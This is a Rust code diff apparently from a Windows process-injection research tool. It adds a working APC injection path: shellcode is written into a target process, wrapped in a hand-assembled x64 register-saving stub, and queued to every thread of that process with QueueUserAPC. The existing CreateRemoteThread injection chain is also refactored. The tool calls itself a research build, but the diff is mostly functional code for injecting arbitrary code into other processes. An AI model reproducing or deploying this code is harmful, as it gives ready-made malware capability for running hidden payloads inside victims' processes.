@@ -153,13 +153,16 @@ pub fn live_inject(
         return Err("shellcode is empty — nothing to inject".to_string());
     }
     crate::safety::validate_target(pid).map_err(|e| format!("target validation failed: {}", e))?;
-    if *technique != InjectionTechnique::CreateRemoteThread {
-        return Err(format!(
-            "live injection is only implemented for technique '{}' in this research build",
-            InjectionTechnique::CreateRemoteThread.name()
-        ));
+    match technique {
+        InjectionTechnique::CreateRemoteThread => {
+            imp::live_inject_create_remote_thread(pid, shellcode, log)
+        }
+        InjectionTechnique::APC => imp::live_inject_apc(pid, shellcode, log),
+        InjectionTechnique::ThreadHijack => Err(format!(
+            "live injection is not yet implemented for technique '{}'",
+            technique.name()
+        )),
     }
-    imp::live_inject_create_remote_thread(pid, shellcode, log)
 }
 
 pub fn run_live_injection(pid: u32, technique_name: &str, payload_path: &str, log: &LogSink) {
@@ -213,6 +216,40 @@ pub fn cleanup_remote(pid: u32, remote_base: u64, size: usize, log: &LogSink) {
     imp::cleanup(pid, remote_base, size, log);
 }
 
+#[rustfmt::skip]
+pub(crate) fn wrap_for_apc(shellcode: &[u8]) -> Vec<u8> {
+    const PROLOGUE: &[u8] = &[
+        0x53,                           // push rbx
+        0x55,                           // push rbp
+        0x57,                           // push rdi
+        0x56,                           // push rsi
+        0x41, 0x54,                     // push r12
+        0x41, 0x55,                     // push r13
+        0x41, 0x56,                     // push r14
+        0x41, 0x57,                     // push r15
+        0x48, 0x83, 0xEC, 0x28,        // sub rsp, 0x28
+        0xE8, 0x11, 0x00, 0x00, 0x00,  // call +17 (jump over epilogue to shellcode)
+    ];
+    const EPILOGUE: &[u8] = &[
+        0x48, 0x83, 0xC4, 0x28,        // add rsp, 0x28
+        0x41, 0x5F,                     // pop r15
+        0x41, 0x5E,                     // pop r14
+        0x41, 0x5D,                     // pop r13
+        0x41, 0x5C,                     // pop r12
+        0x5E,                           // pop rsi
+        0x5F,                           // pop rdi
+        0x5D,                           // pop rbp
+        0x5B,                           // pop rbx
+        0xC3,                           // ret
+    ];
+
+    let mut wrapped = Vec::with_capacity(PROLOGUE.len() + EPILOGUE.len() + shellcode.len());
+    wrapped.extend_from_slice(PROLOGUE);
+    wrapped.extend_from_slice(EPILOGUE);
+    wrapped.extend_from_slice(shellcode);
+    wrapped
+}
+
 #[cfg(windows)]
 mod imp {
     use crate::log::LogSink;
@@ -222,10 +259,14 @@ mod imp {
         VirtualAllocEx, VirtualFreeEx, VirtualProtectEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
         PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
     };
+    use windows::Win32::System::Diagnostics::ToolHelp::{
+        CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32, TH32CS_SNAPTHREAD,
+    };
     use windows::Win32::System::Threading::{
-        CreateRemoteThread, GetExitCodeThread, OpenProcess, WaitForSingleObject, INFINITE,
-        LPTHREAD_START_ROUTINE, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
-        PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
+        CreateRemoteThread, GetExitCodeThread, OpenProcess, OpenThread, QueueUserAPC,
+        WaitForSingleObject, INFINITE, LPTHREAD_START_ROUTINE, PROCESS_CREATE_THREAD,
+        PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
+        THREAD_SET_CONTEXT,
     };
 
     pub fn live_inject_create_remote_thread(
@@ -246,7 +287,7 @@ mod imp {
             format!("OpenProcess failed: {e} (check privileges — try from an elevated shell)")
         })?;
 
-        let result = inject_chain(process, shellcode, log);
+        let result = crt_inject_chain(process, shellcode, log);
         let _ = unsafe { CloseHandle(process) };
         result
     }
@@ -281,14 +322,18 @@ mod imp {
         }
     }
 
-    fn inject_chain(
+    fn write_remote_payload(
         process: HANDLE,
         shellcode: &[u8],
+        total_steps: u32,
         log: &LogSink,
-    ) -> Result<super::InjectionResult, String> {
+    ) -> Result<*mut core::ffi::c_void, String> {
         let size = shellcode.len();
 
-        log.step("[2/6] VirtualAllocEx — MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE");
+        log.step(format!(
+            "[2/{}] VirtualAllocEx — MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE",
+            total_steps
+        ));
         let base = unsafe {
             VirtualAllocEx(
                 process,
@@ -309,7 +354,7 @@ mod imp {
             base, size
         ));
 
-        log.step(format!("[3/6] WriteProcessMemory — {} bytes", size));
+        log.step(format!("[3/{}] WriteProcessMemory — {} bytes", total_steps, size));
         let mut written: usize = 0;
         if let Err(e) = unsafe {
             WriteProcessMemory(
@@ -325,7 +370,10 @@ mod imp {
         }
         log.info(format!("      wrote {} bytes", written));
 
-        log.step("[4/6] VirtualProtectEx — PAGE_READWRITE -> PAGE_EXECUTE_READ");
+        log.step(format!(
+            "[4/{}] VirtualProtectEx — PAGE_READWRITE -> PAGE_EXECUTE_READ",
+            total_steps
+        ));
         let mut old_protect = PAGE_PROTECTION_FLAGS(0);
         if let Err(e) = unsafe {
             VirtualProtectEx(
@@ -343,6 +391,17 @@ mod imp {
             "      remote page is now PAGE_EXECUTE_READ (previous protection: {:#x})",
             old_protect.0
         ));
+
+        Ok(base)
+    }
+
+    fn crt_inject_chain(
+        process: HANDLE,
+        shellcode: &[u8],
+        log: &LogSink,
+    ) -> Result<super::InjectionResult, String> {
+        let size = shellcode.len();
+        let base = write_remote_payload(process, shellcode, 6, log)?;
 
         log.step(format!(
             "[5/6] CreateRemoteThread — start at remote address {:#p}",
@@ -402,7 +461,9 @@ mod imp {
                 exit_code
             ));
             log.error("      the shellcode hit an invalid memory access");
-            log.error("      the injection pipeline is OK (NOP payload works) — the payload is broken");
+            log.error(
+                "      the injection pipeline is OK (NOP payload works) — the payload is broken",
+            );
         } else if exit_code >= 0xC0000000 {
             log.warning(format!(
                 "      remote thread exited with NTSTATUS error 0x{:X}",
@@ -423,6 +484,110 @@ mod imp {
             size,
         })
     }
+
+    pub fn live_inject_apc(
+        pid: u32,
+        shellcode: &[u8],
+        log: &LogSink,
+    ) -> Result<super::InjectionResult, String> {
+        log.step(format!(
+            "[1/5] OpenProcess(PID {}) — PROCESS_QUERY_INFORMATION | PROCESS_VM_*",
+            pid
+        ));
+        let process_access = PROCESS_QUERY_INFORMATION
+            | PROCESS_VM_OPERATION
+            | PROCESS_VM_READ
+            | PROCESS_VM_WRITE;
+        let process = unsafe { OpenProcess(process_access, FALSE, pid) }.map_err(|e| {
+            format!("OpenProcess failed: {e} (check privileges — try from an elevated shell)")
+        })?;
+
+        let result = apc_inject_chain(process, pid, shellcode, log);
+        let _ = unsafe { CloseHandle(process) };
+        result
+    }
+
+    fn apc_inject_chain(
+        process: HANDLE,
+        pid: u32,
+        shellcode: &[u8],
+        log: &LogSink,
+    ) -> Result<super::InjectionResult, String> {
+        let wrapped = super::wrap_for_apc(shellcode);
+        let size = wrapped.len();
+        let base = write_remote_payload(process, &wrapped, 5, log)?;
+
+        log.step("[5/5] QueueUserAPC — enumerating threads and queuing APCs");
+
+        let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) }.map_err(|e| {
+            free_remote(process, base, log);
+            format!("CreateToolhelp32Snapshot failed: {e}")
+        })?;
+
+        let mut entry = THREADENTRY32 {
+            dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
+            ..Default::default()
+        };
+
+        let mut queued: u32 = 0;
+        let mut total: u32 = 0;
+
+        if unsafe { Thread32First(snapshot, &mut entry) }.is_ok() {
+            loop {
+                if entry.th32OwnerProcessID == pid {
+                    total += 1;
+                    if let Ok(thread) =
+                        unsafe { OpenThread(THREAD_SET_CONTEXT, FALSE, entry.th32ThreadID) }
+                    {
+                        let apc_func = Some(unsafe {
+                            core::mem::transmute::<
+                                *mut core::ffi::c_void,
+                                unsafe extern "system" fn(usize),
+                            >(base)
+                        });
+                        if unsafe { QueueUserAPC(apc_func, thread, 0) } != 0 {
+                            queued += 1;
+                            log.info(format!(
+                                "      queued APC to thread TID {}",
+                                entry.th32ThreadID
+                            ));
+                        }
+                        let _ = unsafe { CloseHandle(thread) };
+                    }
+                }
+                if unsafe { Thread32Next(snapshot, &mut entry) }.is_err() {
+                    break;
+                }
+            }
+        }
+        let _ = unsafe { CloseHandle(snapshot) };
+
+        if queued == 0 {
+            free_remote(process, base, log);
+            if total == 0 {
+                return Err(format!("no threads found for PID {}", pid));
+            }
+            return Err(format!(
+                "found {} threads but could not queue APC to any of them",
+                total
+            ));
+        }
+
+        log.info(format!(
+            "      APCs queued to {}/{} threads",
+            queued, total
+        ));
+        log.warning("      shellcode executes when a thread enters alertable wait (async)");
+        log.info(format!(
+            "      shellcode at remote address {:#p} ({} bytes, wrapped {}+38)",
+            base, size,
+            size - 38
+        ));
+        Ok(super::InjectionResult {
+            remote_base: base as u64,
+            size,
+        })
+    }
 }
 
 #[cfg(not(windows))]
@@ -430,6 +595,17 @@ mod imp {
     use crate::log::LogSink;
 
     pub fn live_inject_create_remote_thread(
+        _pid: u32,
+        _shellcode: &[u8],
+        _log: &LogSink,
+    ) -> Result<super::InjectionResult, String> {
+        Err(
+            "live injection requires Windows — this build is running on a non-Windows host"
+                .to_string(),
+        )
+    }
+
+    pub fn live_inject_apc(
         _pid: u32,
         _shellcode: &[u8],
         _log: &LogSink,
